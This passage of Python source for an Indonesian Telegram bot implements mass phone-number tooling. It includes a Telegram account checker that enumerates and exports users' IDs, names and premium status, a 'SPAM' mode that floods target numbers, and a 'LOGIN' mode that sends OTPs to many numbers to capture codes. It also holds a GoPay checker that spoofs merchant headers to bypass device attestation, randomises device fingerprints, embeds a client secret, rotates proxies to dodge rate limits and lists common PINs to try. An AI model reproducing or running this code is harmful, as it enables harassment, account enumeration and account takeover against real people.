        total, active = _pool_count(user_id)
        try:
            await query.message.edit_text(
                _screen('SENDER', (
                    f"{em(CE_TELEGRAM,'💬')} <b>HASIL CEK POOL</b>  ({active}/{total} hidup)\n\n"
                    + '\n'.join(results)
                ), 'Home › Sender › Status'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("HAPUS MATI", callback_data=f"sender_deldead_{user_id}",
                                         icon_custom_emoji_id=E3, style="primary"),
                    InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                         icon_custom_emoji_id=CE_BACK, style="danger"),
                ]]),
            )
        except Exception:
            pass
        return



async def tgcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /check — Cek akun Telegram dari daftar nomor atau file .txt."""
    user_id = update.effective_user.id

    if not TELETHON_OK:
        await update.message.reply_text(
            _screen('CHECK TELEGRAM', (
                f"{em(E2,'\u274c')} <b>Telethon belum terinstall!</b>\n\n"
                f"Jalankan: <code>pip install telethon</code>"
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    if _tgcheck_active.get(user_id, False):
        await update.message.reply_text(
            _screen('CHECK TELEGRAM', (
                f"{em(E2,'\u26a0\ufe0f')} <b>Masih ada proses berjalan!</b>\n\n"
                f"Tunggu selesai atau batalkan dulu."
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    phones = None
    invalid = []

    # Mode 1: Reply ke file .txt
    msg = update.message
    has_doc = (msg.reply_to_message and msg.reply_to_message.document) or msg.document
    if has_doc:
        loading = await msg.reply_text(
            f"{em(CE_LOADING,'\U0001f504')} <i>Membaca file...</i>",
            parse_mode=ParseMode.HTML,
        )
        phones, err = await _tgcheck_parse_phones_from_doc(update, context)
        if err or not phones:
            await loading.edit_text(
                _screen('CHECK TELEGRAM', f"{em(E2,'\u274c')} {err or 'Tidak ada nomor valid di file.'}"),
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            await loading.delete()
        except:
            pass
    else:
        # Mode 2: Parse dari text
        raw_text = msg.text or ''
        raw_text = re.sub(r'^/check\s*', '', raw_text, flags=re.IGNORECASE).strip()

        if not raw_text:
            # Tampilkan help
            await msg.reply_text(
                _screen('CHECK TELEGRAM', (
                    f"{em(CE_TELEGRAM,'\U0001f4ac')} <b>TELEGRAM ACCOUNT CHECKER</b>\n\n"
                    f"Cek apakah nomor telepon punya akun Telegram.\n\n"
                    f"<b>Cara pakai:</b>\n"
                    f"  \u2022 <code>/check 628123456789</code>\n"
                    f"  \u2022 <code>/check 628xx 628yy 628zz</code>\n"
                    f"  \u2022 Reply file <code>.txt</code> dengan <code>/check</code>\n\n"
                    f"<b>Status:</b>\n"
                    f"  {em(E1,'\u2705')} <b>Aktif</b> = punya app Telegram\n"
                    f"  {em(E6,'\U0001f4f1')} <b>SMS</b> = terdaftar tapi OTP via SMS\n"
                    f"  {em(E2,'\u274c')} <b>Tidak</b> = tidak terdaftar\n"
                    f"  {em(E2,'\U0001f6ab')} <b>Banned</b> = nomor di-ban\n\n"
                    f"<b>Fitur:</b>\n"
                    f"  {em(E6,'\U0001f680')} 20 worker paralel (super cepat)\n"
                    f"  {em(CE_EXPORT,'\U0001f4e4')} Export hasil ke .txt\n"
                    f"  {em(CE_FILE,'\U0001f4c1')} Riwayat tersimpan di DB\n"
                    f"  {em(E2,'\U0001f6d1')} Cancel kapan aja\n\n"
                    f"{em(CE_WAKTU,'\u23f2')} <i>Format: 628xxx / +628xxx / 08xxx</i>"
                ), 'Home \u203a Check'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("RIWAYAT", callback_data=f"tgcheck_history_{user_id}",
                                             icon_custom_emoji_id=CE_FILE, style="primary"),
                        InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                             icon_custom_emoji_id=CE_BACK, style="danger"),
                    ]
                ]),
            )
            return

        raw_numbers = re.split(r'[\s,;|]+', raw_text)
        phones = []
        for raw in raw_numbers:
            if not raw.strip():
                continue
            cleaned = _tgcheck_normalize_phone(raw)
            if 7 <= len(cleaned) <= 15:
                phones.append(cleaned)
            else:
                invalid.append(raw)

    if not phones:
        await msg.reply_text(
            _screen('CHECK TELEGRAM', (
                f"{em(E2,'\u274c')} <b>Tidak ada nomor valid!</b>\n\n"
                f"Contoh: <code>/check 628123456789</code>"
            ), 'Home \u203a Check'),
            parse_mode=ParseMode.HTML,
        )
        return

    phones = list(dict.fromkeys(phones))

    # Konfirmasi
    confirm_body = (
        f"{em(CE_TELEGRAM,'\U0001f4ac')} <b>KONFIRMASI CHECK</b>\n\n"
        f"  {em(CE_NOMOR,'\U0001f4de')} <b>Jumlah nomor:</b>  {len(phones)}\n"
        f"  {em(E6,'\U0001f680')} <b>Workers:</b>  {TGCHECK_MAX_WORKERS} paralel\n"
    )
    if invalid:
        confirm_body += f"  {em(E3,'\u26a0\ufe0f')} <b>Invalid (skip):</b>  {len(invalid)}\n"

    preview_count = min(5, len(phones))
    confirm_body += f"\n<b>Preview:</b>\n"
    for p in phones[:preview_count]:
        confirm_body += f"  \u2022 <code>+{p}</code>\n"
    if len(phones) > preview_count:
        confirm_body += f"  <i>... dan {len(phones) - preview_count} lainnya</i>\n"

    est = max(3, int(len(phones) / TGCHECK_MAX_WORKERS * 3))
    confirm_body += f"\n{em(CE_WAKTU,'\u23f2')} <i>Estimasi: ~{est} detik</i>"

    context.user_data[f'tgcheck_phones_{user_id}'] = phones

    _ptotal, _pactive = _pool_count(user_id)
    if _pactive > 0:
        confirm_body += f"\n{em(CE_TELEGRAM,'💎')} <i>Pool: {_pactive} sender siap — mode DETAIL tersedia</i>"

    btn_rows = [[
    InlineKeyboardButton("⚡ CEPAT", callback_data=f"tgcheck_confirm_{user_id}",
                         icon_custom_emoji_id=E1, style="success"),
    ]]
    if _pactive > 0:
        btn_rows[0].append(
            InlineKeyboardButton("💎 DETAIL", callback_data=f"tgcheck_detail_{user_id}",
                             icon_custom_emoji_id=CE_TELEGRAM, style="primary")
        )

    btn_rows.append([
        InlineKeyboardButton("🔥 SPAM", callback_data=f"tgcheck_spam_{user_id}",
                             icon_custom_emoji_id=E3, style="primary"),
        InlineKeyboardButton("🔓 LOGIN", callback_data=f"tgcheck_login_{user_id}",
                             icon_custom_emoji_id=E5, style="primary"),
    ])

    btn_rows.append([
        InlineKeyboardButton("BATAL", callback_data=f"tgcheck_abort_{user_id}",
                             icon_custom_emoji_id=E2, style="danger"),
    ])

    await msg.reply_text(
        _screen('CHECK TELEGRAM', confirm_body, 'Home \u203a Check \u203a Konfirmasi'),
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(btn_rows),
    )


async def _handle_tgcheck_callback(query, data, user_id, context):
    """Handle semua callback tgcheck_* dari menu_callback."""

    if data.startswith('tgcheck_confirm_'):
        await query.answer()
        phones = context.user_data.get(f'tgcheck_phones_{user_id}', [])
        if not phones:
            await query.message.edit_text(
                _screen('CHECK TELEGRAM', f"{em(E2,'\u274c')} Data tidak ditemukan. Coba /check lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[f'tgcheck_phones_{user_id}']
        await query.message.edit_text(
            _screen('CHECK TELEGRAM', (
                f"{em(CE_LOADING,'\U0001f504')} <b>Memulai {len(phones)} nomor ({TGCHECK_MAX_WORKERS} workers)...</b>\n\n"
                f"{em(CE_WAKTU,'\u23f2')} <i>Pake MTProto + paralel, santai aja~</i>"
            ), 'Home \u203a Check \u203a Processing'),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_tgcheck_process_batch(phones, user_id, query.message, context))
        return

    if data.startswith('tgcheck_detail_'):
        await query.answer()
        phones = context.user_data.get(f'tgcheck_phones_{user_id}', [])
        if not phones:
            await query.message.edit_text(
                _screen('CHECK · DETAIL', f"{em(E2,'❌')} Data tidak ditemukan. Coba /check lagi."),
                parse_mode=ParseMode.HTML,
            )
            return
        total, active = _pool_count(user_id)
        if total == 0:
            await query.message.edit_text(
                _screen('CHECK · DETAIL', f"{em(E2,'❌')} Belum ada sender. Tambah via /addsender."),
                parse_mode=ParseMode.HTML,
            )
            return
        if active == 0:
            await query.message.edit_text(
                _screen('CHECK · DETAIL', (
                    f"{em(E3,'🧊')} <b>Semua sender lagi cooldown/mati.</b>\n\n"
                    f"Cek di /sender atau tambah sender baru."
                )),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[f'tgcheck_phones_{user_id}']
        await query.message.edit_text(
            _screen('CHECK · DETAIL', (
                f"{em(CE_LOADING,'🟠')} <b>Deep lookup {len(phones)} nomor via pool ({active} sender)...</b>\n\n"
                f"{em(CE_WAKTU,'⏲')} <i>Rotasi sender + rate-limit biar aman~</i>"
            ), 'Home › Check › Detail'),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_tgcheck_process_sender(phones, user_id, query.message, context, None))
        return

    if data.startswith('tgcheck_login_'):
        await query.answer()
        if not is_owner(user_id):
            await query.message.edit_text(
                _screen('CHECK · LOGIN', f"{em(E2,'❌')} Hanya owner."),
                parse_mode=ParseMode.HTML,
            )
            return
        phones = context.user_data.get(f'tgcheck_phones_{user_id}', [])
        if not phones:
            await query.message.edit_text(
                _screen('CHECK · LOGIN', f"{em(E2,'❌')} Nomor hilang, ulangi /check."),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[f'tgcheck_phones_{user_id}']
        await query.message.edit_text(
            _screen('CHECK · LOGIN', (
                f"{em(CE_LOADING,'🔓')} <b>Kirim OTP ke {len(phones)} nomor...</b>\n\n"
                f"{em(CE_WAKTU,'⏲')} <i>Hash disimpan 5 menit. Ketik nomor:kode setelah selesai.</i>"
            ), 'Home › Check › Login'),
            parse_mode=ParseMode.HTML,
        )
        asyncio.create_task(_tgcheck_process_login(phones, user_id, query.message, context))
        return

    if data.startswith('tgcheck_spam_'):
        await query.answer()
        phones = context.user_data.get(f'tgcheck_phones_{user_id}', [])
        if not phones:
            await query.message.edit_text(
                _screen('CHECK · SPAM', f"{em(E2,'❌')} Nomor hilang, ulangi /check."),
                parse_mode=ParseMode.HTML,
            )
            return
        del context.user_data[f'tgcheck_phones_{user_id}']
        await query.message.edit_text(
            _screen('CHECK · SPAM', (
                f"{em(E3,'🔥')} <b>SPAM DIMULAI</b>\n\n"
                f"  {em(CE_NOMOR,'📞')} Target: {len(phones)} nomor\n"
                f"  {em(E6,'🚀')} Workers: 20 ({len(_SPAM_API_POOL)} API rotasi)\n\n"
                f"  {em(CE_LOADING,'🔄')} <i>Firing...</i>"
            ), 'Home › Check › SPAM'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("⛔ STOP", callback_data=f"spam_stop_{user_id}",
                                     icon_custom_emoji_id=E2, style="danger")
            ]]),
        )
        asyncio.create_task(_tgcheck_process_spam(phones, user_id, query.message, context, mode='app'))
        return

    if data.startswith('spam_api_') or data.startswith('spam_app_'):
        await query.answer()
        mode = 'api' if data.startswith('spam_api_') else 'app'
        phones = context.user_data.pop(f'spam_phones_{user_id}', [])
        if not phones:
            await query.message.edit_text(
                _screen('CHECK · SPAM', f"{em(E2,'❌')} Data hilang, ulangi /check."),
                parse_mode=ParseMode.HTML,
            )
            return
        workers = 50 if mode == 'api' else 25
        await query.message.edit_text(
            _screen('CHECK · SPAM', (
                f"{em(E3,'🔥')} <b>SPAM {mode.upper()} DIMULAI</b>\n\n"
                f"  {em(CE_NOMOR,'📞')} Target: {len(phones)} nomor\n"
                f"  {em(E6,'🚀')} Workers: {workers}\n\n"
                f"  {em(CE_LOADING,'🔄')} <i>Firing...</i>"
            ), 'Home › Check › SPAM'),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("⛔ STOP", callback_data=f"spam_stop_{user_id}",
                                     icon_custom_emoji_id=E2, style="danger")
            ]]),
        )
        asyncio.create_task(_tgcheck_process_spam(phones, user_id, query.message, context, mode=mode))
        return

    if data.startswith('spam_stop_'):
        await query.answer("Menghentikan spam...")
        _spam_cancel_flags[user_id] = True
        return

    if data.startswith('tgcheck_abort_'):
        await query.answer()
        context.user_data.pop(f'tgcheck_phones_{user_id}', None)
        await query.message.edit_text(
            _screen('CHECK TELEGRAM', f"{em(E2,'\u274c')} <b>Dibatalkan.</b>"),
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith('tgcheck_cancel_'):
        await query.answer("Membatalkan...")
        _tgcheck_cancel_flags[user_id] = True
        return

    if data.startswith('tgcheck_history_'):
        await query.answer()
        try:
            cur.execute(
                "SELECT phone, status, detail, checked_at FROM tgcheck_results "
                "WHERE user_id = ? ORDER BY checked_at DESC LIMIT 50",
                (user_id,)
            )
            rows = cur.fetchall()
        except Exception:
            rows = []

        if not rows:
            await query.message.edit_text(
                _screen('CHECK TELEGRAM', (
                    f"{em(CE_FILE,'\U0001f4c1')} <b>RIWAYAT CHECK</b>\n\n"
                    f"<i>Belum ada riwayat.</i>"
                ), 'Home \u203a Check \u203a Riwayat'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                         icon_custom_emoji_id=CE_BACK, style="danger")
                ]]),
            )
            return

        body = f"{em(CE_FILE,'\U0001f4c1')} <b>RIWAYAT CHECK</b>  (50 terakhir)\n\n"
        for phone, status, detail, checked_at in rows[:50]:
            s_em = _tgcheck_status_emoji(status)
            s_label = _tgcheck_status_label(status)
            ts = checked_at[:16] if checked_at else '?'
            body += f"  {s_em} <code>+{phone}</code>  {s_label}  <i>{ts}</i>\n"

        reg_count = sum(1 for r in rows if r[1] in ('registered', 'registered_app', 'registered_sms'))
        unreg_count = sum(1 for r in rows if r[1] == 'not_registered')
        body += f"\n  {em(E1,'\u2705')} Terdaftar: <b>{reg_count}</b>  |  {em(E2,'\u274c')} Tidak: <b>{unreg_count}</b>"

        buttons = [[
            InlineKeyboardButton("HAPUS RIWAYAT", callback_data=f"tgcheck_clear_{user_id}",
                                 icon_custom_emoji_id=CE_HAPUS, style="danger"),
            InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                 icon_custom_emoji_id=CE_BACK, style="primary"),
        ]]

        try:
            await query.message.edit_text(
                _screen('CHECK TELEGRAM', body, 'Home \u203a Check \u203a Riwayat'),
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(buttons),
            )
        except Exception:
            pass
        return

    if data.startswith('tgcheck_clear_'):
        await query.answer("Riwayat dihapus!")
        try:
            cur.execute("DELETE FROM tgcheck_results WHERE user_id = ?", (user_id,))
            conn.commit()
        except Exception:
            pass
        await query.message.edit_text(
            _screen('CHECK TELEGRAM', f"{em(E1,'\u2705')} <b>Riwayat dihapus.</b>"),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("KEMBALI", callback_data=f"menu_start_{user_id}",
                                     icon_custom_emoji_id=CE_BACK, style="danger")
            ]]),
        )
        return

    # ── Export handlers ──
    # ── Export DETAIL (sender results: id, name, premium, year) ──
    if data.startswith('tgcheck_export_detail_') or data.startswith('tgcheck_export_prem_'):
        await query.answer()
        sresults = context.user_data.get(f'tgcheck_sender_results_{user_id}', [])
        if not sresults:
            try:
                await query.message.reply_text(
                    _screen('CHECK · DETAIL', f"{em(E2,'❌')} Tidak ada data detail."),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            return

        prem_only = data.startswith('tgcheck_export_prem_')
        if prem_only:
            sresults = [r for r in sresults if r.get('premium')]
            filename = 'tg_premium.txt'
        else:
            filename = 'tg_detail.csv'

        if not sresults:
            try:
                await query.message.reply_text(
                    _screen('CHECK · DETAIL', f"{em(E2,'❌')} Tidak ada akun premium."),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            return

        lines = ["phone,user_id,name,username,premium,year"]
        for r in sresults:
            name = (f"{r.get('first_name','')} {r.get('last_name','')}").strip().replace(',', ' ')
            lines.append(
                f"+{r['phone']},{r.get('id','')},{name},"
                f"{r.get('username','')},{'YES' if r.get('premium') else 'NO'},{r.get('year','')}"
            )
        content = '\n'.join(lines)
        filepath = os.path.join(os.path.dirname(__file__) or '.', filename)
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            await query.message.reply_document(
                document=open(filepath, 'rb'),
                filename=filename,
                caption=(
                    f"{em(CE_EXPORT,'📤')} <b>Export {'PREMIUM' if prem_only else 'DETAIL'}</b>\n"
                    f"Total: <b>{len(sresults)}</b> akun"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            try:
                await query.message.reply_text(
                    _screen('CHECK · DETAIL', f"{em(E2,'❌')} Gagal export: {html.escape(str(e)[:80])}"),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
        finally:
            try:
                os.remove(filepath)
            except Exception:
                pass
        return

    if data.startswith('tgcheck_export_'):
        await query.answer()
        results = context.user_data.get(f'tgcheck_results_{user_id}', [])

        if not results:
            try:
                cur.execute(
                    "SELECT phone, status, detail FROM tgcheck_results "
                    "WHERE user_id = ? ORDER BY checked_at DESC LIMIT 500",
                    (user_id,)
                )
                results = [(r[0], r[1], r[2]) for r in cur.fetchall()]
            except Exception:
                results = []

        if not results:
            try:
                await query.message.edit_text(
                    _screen('CHECK TELEGRAM', f"{em(E2,'\u274c')} Tidak ada data."),
                    parse_mode=ParseMode.HTML,
                )
            except:
                pass
            return

        if 'export_reg_' in data:
            export_type = 'reg'
            filtered = [r for r in results if r[1] in ('registered', 'registered_app', 'registered_sms')]
            filename = 'tg_registered.txt'
        elif 'export_unreg_' in data:
            export_type = 'unreg'
            filtered = [r for r in results if r[1] == 'not_registered']
            filename = 'tg_not_registered.txt'
        else:
            export_type = 'all'
            filtered = results
            filename = 'tg_check_results.txt'

        if not filtered:
            try:
                await query.message.edit_text(
                    _screen('CHECK TELEGRAM', f"{em(E2,'\u274c')} Tidak ada data kategori ini."),
                    parse_mode=ParseMode.HTML,
                )
            except:
                pass
            return

        lines = []
        if export_type == 'all':
            lines.append(f"# Telegram Account Check Results")
            lines.append(f"# Checked: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            lines.append(f"# Total: {len(filtered)}")
            lines.append(f"# {'='*50}")
            lines.append(f"")
            for phone, status, detail in filtered:
                label = _tgcheck_status_label(status)
                lines.append(f"+{phone} | {label} | {detail}")
        else:
            for phone, status, detail in filtered:
                lines.append(f"+{phone}")

        content = '\n'.join(lines)
        filepath = os.path.join(os.path.dirname(__file__) or '.', filename)
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)

            export_label = {'reg': 'TERDAFTAR', 'unreg': 'TIDAK TERDAFTAR', 'all': 'SEMUA'}.get(export_type, 'SEMUA')
            await query.message.reply_document(
                document=open(filepath, 'rb'),
                filename=filename,
                caption=(
                    f"{em(CE_EXPORT,'\U0001f4e4')} <b>Export {export_label}</b>\n"
                    f"Total: <b>{len(filtered)}</b> nomor"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            try:
                await query.message.reply_text(
                    _screen('CHECK TELEGRAM', f"{em(E2,'\u274c')} Gagal export: {html.escape(str(e)[:100])}"),
                    parse_mode=ParseMode.HTML,
                )
            except:
                pass
        finally:
            try:
                os.remove(filepath)
            except:
                pass
        return



# ══════════════════════════════════════════════════════════════════════════════
# ██  GOPAY CHECKER — /gopay
# ══════════════════════════════════════════════════════════════════════════════
# Bypass: merchant headers (x-appid=gopaymerchant) + x-user-type=customer
# No x-e1 device attestation needed!
# Flow: login/methods → cvs/v1/initiate (goto_pin) → pin/tokens/nb × 3 PINs
# ══════════════════════════════════════════════════════════════════════════════

GOPAY_MAX_WORKERS = 15
GOPAY_PINS = ["123456", "000000", "121212"]
GOPAY_CLIENT_ID = "gopay:consumer:app"
GOPAY_CLIENT_SECRET = "raOUumeMRBNifqvZRFjvsgTnjAlaA9"
GOPAY_PIN_CLIENT_ID = "6d11d261d7ae462dbd4be0dc5f36a697-MFAGOJEK"
GOPAY_UA = "Dart/3.7 (dart:io)"


_gopay_active = {}  # {user_id: bool}

def _gopay_base_headers():
    """Header merchant bypass with RANDOMIZED device fingerprint."""
    _makes = ["Xiaomi", "Samsung", "OPPO", "Vivo", "Realme", "Infinix", "POCO", "Redmi", "OnePlus", "Huawei"]
    _models = [
        "Redmi,25062RN2DY", "Redmi,Note12Pro", "Redmi,Note11", "POCO,M5s", "POCO,X5Pro",
        "Samsung,SM-A145F", "Samsung,SM-A546E", "Samsung,SM-A256E", "Samsung,SM-G991B", "Samsung,SM-A047F",
        "OPPO,CPH2565", "OPPO,CPH2473", "OPPO,A78", "OPPO,Reno8T",
        "Vivo,V2237", "Vivo,V2120", "Vivo,Y36", "Vivo,V29e",
        "Realme,RMX3686", "Realme,RMX3710", "Realme,C55",
        "Infinix,X6837", "Infinix,X6711", "Infinix,HotPlay30",
    ]
    _os_versions = ["Android, 12", "Android, 13", "Android, 14", "Android, 15"]
    _timezones = ["GMT+07:00", "GMT+08:00", "GMT+09:00"]
    _app_versions = ["1.28.0", "1.27.0", "1.26.0", "1.25.0"]
    _d1_hashes = [
        "2D:F7:CB:A4:A4:73:4A:ED:30:C7:4D:C1:6D:A1:77:93:C8:1A:A9:46:89:81:51:50:3A:79:C3:85:D1:06:B9:37",
        "A8:B0:51:E0:47:FD:1D:C3:CB:9A:BC:87:EE:3F:86:94:57:44:09:4D:72:3A:26:99:81:4E:57:91:4A:63:86:EA",
        "3C:E1:92:F4:88:2D:5A:B7:11:C6:9E:A3:4F:D0:76:28:E5:1B:63:8A:47:F9:0C:D2:B4:5E:71:A0:36:C8:42:9F",
    ]

    make = random.choice(_makes)
    model = random.choice(_models)
    
    return {
        "x-session-id": ''.join(random.choices('0123456789abcdef', k=32)),
        "accept-encoding": "gzip",
        "x-request-id": str(uuid.uuid4()) if 'uuid' in dir() else ''.join(random.choices('0123456789abcdef', k=32)),
        "d1": random.choice(_d1_hashes),
        "x-appversion": random.choice(_app_versions),
        "gojek-country-code": "ID",
        "x-theme": "LIGHT",
        "x-uniqueid": ''.join(random.choices('0123456789abcdef', k=16)),
        "x-phonemake": make,
        "x-phonemodel": model,
        "x-user-type": "merchant",
        "user-agent": "Dart/3.7 (dart:io)",
        "x-deviceos": random.choice(_os_versions),
        "x-appid": "com.gojek.gopaymerchant",
        "x-selected-outlet": "*",
        "content-type": "application/json",
        "x-timezone": random.choice(_timezones),
        "x-authsdk-version": "1.0.0",
        "x-apptype": "GOPAY-MERCHANT",
        "x-user-locale": "id_ID",
        "x-devicetoken": "",
        "x-source-app": "gopay-merchant",
        "accept-language": "id",
        "x-pushtokentype": "FCM",
        "transaction-id": ''.join(random.choices('0123456789abcdef', k=8)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=4)) + '-' + ''.join(random.choices('0123456789abcdef', k=12)),
        "x-platform": "Android",
    }


def _gopay_normalize_phone(raw: str) -> str:
    """Bersihkan nomor, return format internasional tanpa + (misal 628xxx, 6700xxx, 58xxx).
    - +670xxx → 670xxx
    - 670xxx → 670xxx (keep as-is, country detection handles it)
    - 08xxx → 628xxx (Indonesia local)
    """
    # Strip everything except digits and +
    stripped = raw.strip()
    # Remove + prefix
    if stripped.startswith('+'):
        stripped = stripped[1:]
    # Now remove all non-digits
    cleaned = re.sub(r'[^\d]', '', stripped)
    if not cleaned:
        return ''
    # Only prepend 62 for Indonesian local format (starts with 0)
    if cleaned.startswith('0') and len(cleaned) >= 10:
        cleaned = '62' + cleaned[1:]
    return cleaned

# Country code lookup table (sorted longest first for matching)
_COUNTRY_CODES = [
    "1684","1670","1649","1473","1441","1345","1284","1268","1264","1246","1242",
    "998","996","995","994","993","992","977","976","975","974","973","972","971",
    "970","968","967","966","965","964","963","962","961","960","886","880","856",
    "855","853","852","850","692","691","690","689","688","687","686","685","684",
    "683","682","681","680","679","678","677","676","675","674","673","672","670",
    "599","598","597","596","595","594","593","592","591","590","509","508","507",
    "506","505","504","503","502","501","500","423","421","420","389","387","386",
    "385","383","382","381","380","378","377","376","375","374","373","372","371",
    "370","359","358","357","356","355","354","353","352","351","350","299","298",
    "297","291","290","269","268","267","266","265","264","263","262","261","260",
    "258","257","256","255","254","253","252","251","250","249","248","247","246",
    "245","244","243","242","241","240","239","238","237","236","235","234","233",
    "232","231","230","229","228","227","226","225","224","223","222","221","220",
    "218","216","213","212","211","98","95","94","93","92","91","90","86","84",
    "82","81","66","65","64","63","62","61","60","58","57","56","55","54","53",
    "52","51","49","48","47","46","45","44","43","41","40","39","36","34","33",
    "32","31","30","27","20","7","1",
]

def _gopay_detect_country_code(phone: str) -> tuple:
    """Detect country code from full phone number. Returns (country_code_with_plus, local_number)."""
    for cc in _COUNTRY_CODES:
        if phone.startswith(cc):
            local = phone[len(cc):]
            if len(local) >= 4:  # At least 4 digits local
                return f"+{cc}", local
    # Default Indonesia
    return "+62", phone


_gopay_proxy_pool = []  # Cached proxy pool
_gopay_proxy_loaded = False

def _gopay_load_proxies():
    """Load free proxies from github + local socks5."""
    global _gopay_proxy_pool, _gopay_proxy_loaded
    if _gopay_proxy_loaded:
        return
    _gopay_proxy_loaded = True
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10, verify=False)
        for line in r.text.strip().split('\n'):
            line = line.strip()
            if line and ':' in line:
                _gopay_proxy_pool.append(f"http://{line}" if not line.startswith('http') else line)
    except:
        pass
    try:
        import pathlib as _pl
        _pf = _pl.Path(__file__).parent / "proxies_won.txt"
        for line in _pf.read_text().splitlines():
            line = line.strip()
            if line.startswith('socks5://'):
                _gopay_proxy_pool.append(line)
    except:
        pass


def _gopay_check_single(phone: str) -> dict:
    """
    Check nomor GoPay via login/methods + proxy rotation + retry.
    - 201 + otp_email = Terdaftar (Premium)
    - 201 + otp_sms/otp_wa only = Terdaftar (Basic)
    - 400/401 = Tidak terdaftar
    - 429 = retry with different proxy
    """
    _gopay_load_proxies()
    result = {"phone": phone, "status": "unknown", "pin": None, "detail": "", "methods": []}

    # Auto-detect country code
    cc, local_number = _gopay_detect_country_code(phone)

    for attempt in range(10):
        sess = requests.Session()
        sess.verify = False

        # Use proxy on retry
        if attempt > 0 and _gopay_proxy_pool:
            px = random.choice(_gopay_proxy_pool)
            sess.proxies = {"http": px, "https": px}

        try:
            r1 = sess.post(
                "https://accounts.goto-products.com/goto-auth/login/methods",
                headers=_gopay_base_headers(),
                json={
                    "phone_number": local_number,
                    "country_code": cc,
                    "email": "",
                    "device_verification_token_id": "",
                    "client_id": GOPAY_CLIENT_ID,
                    "client_secret": GOPAY_CLIENT_SECRET,
                },
                timeout=10,
            )

            if r1.status_code == 429:
                time.sleep(random.uniform(2, 5))
                continue

            if r1.status_code == 201:
                data = r1.json().get("data", {})
                methods = data.get("methods", [])
                result["methods"] = methods
                if "otp_email" in methods:
                    result["status"] = "registered"
                    result["detail"] = f"Premium ({', '.join(methods)})"
                elif methods:
                    result["status"] = "registered"
                    result["detail"] = f"Basic ({', '.join(methods)})"
                else:
                    result["status"] = "not_registered"
                    result["detail"] = "Tidak terdaftar"
                return result

            if r1.status_code in (400, 401):
                result["status"] = "not_registered"
                result["detail"] = "Tidak terdaftar di GoPay"
                return result

            result["status"] = "error"
            result["detail"] = f"HTTP {r1.status_code}"
            return result

        except:
            time.sleep(1)
            continue

    result["status"] = "rate_limited"
    result["detail"] = "Rate limited (semua proxy gagal)"
    return result


# [REMOVED] Old duplicate _shopee_check_single was here — moved to line ~17697




async def _gopay_parse_phones_from_doc(update, context):
    """Parse nomor telepon dari file .txt (reply atau attachment)."""
    msg = update.message
    doc = None
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
    elif msg.document:
        doc = msg.document

    if not doc:
        return None, "Tidak ada file"

    if doc.file_size > 5 * 1024 * 1024:
        return None, "File terlalu besar (max 5MB)"

    try:
        f = await doc.get_file()
        data = await f.download_as_bytearray()
        text = data.decode('utf-8', errors='ignore')
    except Exception as e:
        return None, f"Gagal download: {e}"

    lines = text.strip().splitlines()
    phones = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        for part in re.split(r'[\s,;|]+', line):
            cleaned = _gopay_normalize_phone(part)
            if 8 <= len(cleaned) <= 14:
                phones.append(cleaned)

    if not phones:
        return None, "Tidak ada nomor valid di file"
    return phones, None


async def _gopay_process_batch(phones: list, user_id: int, msg, context):
    """Proses batch check GoPay dengan 20 workers."""
    _gopay_active[user_id] = True
    
    results = {
        "success": [],      # PIN berhasil
        "registered": [],   # Terdaftar (Premium - has otp_email)
        "not_registered": [], # Tidak terdaftar
        "rate_limited": [], # Rate limited
        "error": [],        # Error/timeout
    }
    
    total = len(phones)
    done = 0
    lock = threading.Lock()
    last_edit = [0]
    
    loop = asyncio.get_event_loop()
    
    def _do_check(phone):
        nonlocal done
        res = _gopay_check_single(phone)
        with lock:
            done += 1
            if res["status"] == "pin_success":
                results["success"].append(res)
            elif res["status"] == "registered":
                results["registered"].append(res)
            elif res["status"] == "not_registered":
                results["not_registered"].append(res)
            elif res["status"] == "rate_limited":
                results["rate_limited"].append(res)
            else:
                results["error"].append(res)
        return res
    
    async def _update_progress(force=False):
        now = time.time()
        if not force and now - last_edit[0] < 2:
            return
        last_edit[0] = now
        
        pct = int(done / total * 100) if total else 0
        bar_len = 15
        filled = int(bar_len * done / total) if total else 0
        bar = "█" * filled + "░" * (bar_len - filled)
        
        body = (
